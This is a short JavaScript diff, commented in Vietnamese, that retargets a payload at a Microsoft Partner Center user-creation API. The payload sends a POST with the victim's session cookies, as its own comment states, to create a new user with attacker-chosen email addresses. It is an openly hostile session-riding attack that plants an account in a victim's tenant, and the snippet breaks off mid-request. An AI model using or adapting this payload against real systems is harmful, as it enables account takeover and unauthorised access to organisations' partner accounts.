@@ -5,13 +5,13 @@ var data = {
   isGuest: false,
   firstName: "Mose",
   lastName: "Adolph",
-  userPrincipalName: "a1@abc.com",
+  userPrincipalName: "a2@thammyvientienminh.com",
   displayName: "Mose Adolph",
   alternateEmailAddresses: ["fato5@3dboxer.com"]
 };
 
 // Gửi request POST tạo user mới
-fetch("https://alume.com/en-us/dashboard/account/v3/api/users", {
+fetch("https://partner.microsoft.com/en-us/dashboard/account/v3/api/users", {
   method: "POST",
   credentials: "include", // Đảm bảo gửi cookie phiên của nạn nhân
   headers: {
